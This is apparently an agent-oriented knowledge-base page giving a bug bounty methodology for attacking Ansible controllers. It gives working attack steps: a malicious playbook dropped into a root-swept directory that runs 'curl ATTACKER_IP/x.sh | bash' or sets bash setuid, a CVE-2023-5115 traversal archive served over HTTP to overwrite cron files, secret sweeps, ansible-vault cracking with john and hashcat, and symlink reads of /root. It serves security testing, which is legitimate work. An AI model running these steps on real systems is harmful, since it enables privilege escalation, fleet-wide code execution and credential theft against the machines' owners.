---
technology: "Ansible"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
status: confirmed
provenance: "corpus-grounded (strict gate 2026-11-12: 5 target-side attack chains — scheduled playbook-directory hijack via ansible-parallel, sudo ansible-playbook + copy_links symlink archive read, ansible-galaxy role install path traversal through a runner wrapper, world-readable playbooks with crackable user hashes, automation-share vault blobs cracked offline; internal coverage ledger carries both gate counts) + upstream-verified (Red Hat Bugzilla 2233810 / CVE-2023-5115 ansible-galaxy absolute path traversal — note: not an AWX CVE; hashcat -m 16900 and John 'ansible' format for vault; Ansible docs for copy_links, ansible.cfg precedence, ansible-pull). Companion overview: [[ansible|Ansible overview]]. Enrichment pass 2 new-unit wave A, 2026-11-12."
---

# Ansible Bug Bounty Methodology

Companion page: [[ansible|Ansible overview]] — the trust model that makes every
pattern below work.

**Scope:** standalone Ansible controllers and automation hosts, custom runners and
wrappers around `ansible-playbook`/`ansible-galaxy`, leaked automation trees (file
shares, git repos), and credential material (inventories, group_vars, ansible-vault
blobs). **Out of scope:** the managed nodes' SSH layer itself — cross-ref [[ssh]].

## Triage table

| Surface | Gate | Payoff |
|---|---|---|
| Scheduled playbook directory | cron/ansible-parallel sweeps a writable dir as root | Root execution on next sweep — Critical |
| `sudo ansible-playbook` | sudo rule + write access to the playbook or its includes | Root on the controller — Critical |
| Role/task injection via write access | any write into roles/ or playbook includes | Execution on inventory hosts — Critical |
| ansible-galaxy install (CVE-2023-5115) | wrapper/root installs roles from attacker-influenced URLs | Arbitrary file overwrite → root — Critical |
| ansible-pull in cron | pull URL/repo attacker-controllable | Fleet execution — Critical |
| ansible-vault blobs | vault files readable | Offline crack → fleet secrets — High |
| Playbook secret mining | world-readable playbooks/inventories | Credentials (plaintext, sha512crypt, keys) — High |
| `copy_links` tasks | archive/copy tasks following symlinks | Arbitrary file read into retrievable archives — Medium/High |

## Phase 1 — Recon: find the automation spine

```bash
# on-host, after any foothold
ls -la /etc/ansible/ /opt/automation* /opt/playbooks* 2>/dev/null
cat /etc/ansible/ansible.cfg; ls /etc/ansible/playbooks/
crontab -l; cat /etc/cron*/* 2>/dev/null | grep -iE 'ansible|playbook'
ps aux | grep -i ansible; ls -la /usr/local/bin/ | grep -i ansible
sudo -l          # look for: (root) NOPASSWD: /usr/bin/ansible-playbook
```

Custom runners: binaries or scripts exposing `list / run N / install <role_url>`
operations over a playbook directory and calling `/usr/bin/ansible-playbook` /
`/usr/bin/ansible-galaxy` underneath — reverse or read their source when shipped
alongside (`runner.c` left next to the binary in one case); the auth key gating them
is usually recoverable from readable config or the binary itself.

Off-host: enumerate shares and repos for automation trees (`Automation/Ansible`
directory shapes, repos with `playbooks/`, `roles/`, `group_vars/`) and pull them —
a read-only share is still a secrets dump (Phase 4).

## Phase 2 — Playbook and task hijack (execution as root)

- **Scheduled sweep hijack**: a cron entry runs `ansible-parallel` or a loop over
  `/opt/automation/tasks/*.yml` as root. Write your own playbook into the swept
  directory and wait:
  ```yaml
  # /opt/automation/tasks/pwn.yml  (dir writable by your user)
  - hosts: localhost
    tasks:
      - name: innocuous-name
        shell: curl ATTACKER_IP/x.sh | bash
        # or: copy authorized_keys, chmod u+s /bin/bash
  ```
- **Wrapper install abuse**: a runner's `install <role_url>` fetches a role archive
  over HTTP and hands it to `ansible-galaxy`; combined with CVE-2023-5115
  (Phase 3) or with the simple fact that role *tasks run* when the playbook is
  executed, a URL you control is execution.
- **Sudo `ansible-playbook`**: the delegated user runs a fixed playbook as root —
  but the playbook's includes, roles, or the file it copies are yours to edit if
  their permissions allow. Read the whole task tree before claiming the primitive;
  the classic gap is the playbook being root-owned while a *role directory* it
  includes is group-writable.

## Phase 3 — ansible-galaxy path traversal (CVE-2023-5115, upstream-verified)

An absolute path traversal in role-archive handling lets a malicious Ansible role
archive make `ansible-galaxy` **overwrite arbitrary files** outside the roles path
during install (Red Hat Bugzilla 2233810; fixed releases per the advisory). Combine
with anything that installs roles from attacker-influenced URLs:

```bash
# role archive containing paths like ../../../../etc/cron.d/pwn
tar czf evil.tar.gz <traversal tree>
python3 -m http.server 80   # serve it; trigger the wrapper's install action
/usr/bin/ansible-galaxy --version   # version-gate against the advisory on-host
```

Then a scheduled file overwrite (cron.d entry, authorized_keys, a script the
playbook runs) converts the write into execution as the installing user — root,
when the runner is root. The observed chain was exactly: wrapper `install
http://ATTACKER/role.tar` → traversal overwrite → root.

## Phase 4 — Secret mining and vault cracking

```bash
# plaintext and hashes first
grep -RniE 'pass(word)?|secret|token|api_key|private' /etc/ansible/ /opt/*/playbooks/
# user module hashes are sha512crypt by default ($6$...) — crack offline
# vault blobs:
grep -Rl '\$ANSIBLE_VAULT' /etc/ansible/ /shares/automation/ .
```

Vault cracking (the blobs are `$ANSIBLE_VAULT;1.1;AES256;…` hex):

```bash
ansible2john vault.yml > vault.hash            # or ansible-vault2john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=ansible vault.hash
# hashcat equivalent: -m 16900 (Ansible Vault) — use --user if lines carry name prefixes
ansible-vault view vault.yml                   # decrypt with the cracked password
```

Observed results: vault passwords were ordinary rockyou-class strings, and the
cleartext held directory-service administrator logins and service passwords that
opened the next segment of the network. World-readable playbooks alone (no vault)
leaked `user` module `password_hash` values — crack them like any sha512crypt.

## Phase 5 — Config, connection, and archive abuse

- **`ansible.cfg` precedence**: a copy in the working directory overrides the
  system one (documented behavior) — a writable playbook dir lets a foothold user
  steer `callback_plugins`, `vault_password_file`, or inventory paths on the next
  root run.
- **`copy_links: yes`** (documented module flag): copy/archive tasks follow
  symlinks. One chain: a root-run backup playbook archived a directory where the
  foothold user could plant a symlink to `/root` — the tarball (readable after
  creation) contained the followed contents. Plant `ln -s /root shadowed-file` in
  any swept directory and watch where output lands.
- **ansible-pull abuse** (upstream context — not corpus-observed): cron entries
  running `ansible-pull -U <repo_url>` make every node fetch and execute playbooks
  from that repository on schedule. Compromise the repo (credentials in the cron
  entry or the deploy key), or the reference it clones, and the fleet executes your
  playbook. Check `/etc/cron*` and systemd timers for the pull line and where its
  URL lives.
- **AWX/Tower surface** (upstream context — not corpus-observed): the web tier
  exposes REST APIs holding inventories and credentials; credential-injection and
  execution-template abuse are the documented post-auth classes. Audit it like any
  other web tier holding fleet secrets.

## Command quick reference

```bash
ansible-playbook --syntax-check pwn.yml      # validate payload before the sweep
ansible-galaxy list / install <role>          # enumerate what the controller runs
ansible-vault view secret.yml                 # with cracked password
grep -RniE '\$ANSIBLE_VAULT|\$6\$|ansible_ssh_pass' .   # secret sweep of a tree
```

## Tool mapping (prose)

john with the ansible format (via the ansible2john converter) or hashcat in Ansible
Vault mode for blobs; standard tar and a python HTTP server for role-archive
delivery; git for automation repositories; grep/ripgrep for secret sweeps across
pulled trees. Tools vault owns per-tool detail.
